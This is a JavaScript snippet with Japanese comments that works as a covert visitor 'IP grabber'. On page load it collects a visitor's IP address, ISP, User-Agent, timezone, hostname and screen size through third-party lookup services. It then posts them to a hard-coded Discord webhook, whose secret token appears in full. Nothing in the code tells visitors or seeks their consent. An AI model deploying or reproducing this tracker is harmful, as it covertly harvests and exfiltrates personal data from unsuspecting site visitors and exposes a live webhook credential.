

// アクセスした人のUser-Agentを取得する
const userAgent = window.navigator.userAgent;

// アクセスした人のIPを取得する
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // アクセスした人のタイムゾーンを取得する
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // アクセスした人のホスト名を取得する
    const hostName = window.location.hostname;

    // アクセスした人のISP情報を取得する
    fetch(`https://ipapi.co/${ip}/json/`)
      .then(response => response.json())
      .then(data => {
        const isp = data.org;

        // DiscordのWebhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1096359611025596466/62Mx7UMX2KpAFFonceWoMoSrL4m0Ie0zuxQ6xRy1cbLZcTwGZxYC9iG7ZFXYzQQItD9A';

        // アクセスした人のデバイス情報をまとめる
        const deviceInfo = {
          'User-Agent': userAgent,
          'IP': ip,
          'Timezone': timeZone,
          'Hostname': hostName,
          'ISP': isp,
          'Device': `${window.screen.width}x${window.screen.height}`,
        };

        // DiscordのWebhookにデータを送信する
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            embeds: [{
              title: 'アクセス情報',
              color: 16711680,
              fields: [
                {
                  name: 'User-Agent',
                  value: deviceInfo['User-Agent'],
                },
                {
                  name: 'IP',
                  value: deviceInfo['IP'],
                },
                {
                  name: 'Timezone',
                  value: deviceInfo['Timezone'],
                },
                {
                  name: 'Hostname',
                  value: deviceInfo['Hostname'],
                },
                {
                  name: 'ISP',
                  value: deviceInfo['ISP'],
                },
                {
                  name: 'Device',
                  value: deviceInfo['Device'],
                },
              ],
            }],
          }),
        });
      });
  });
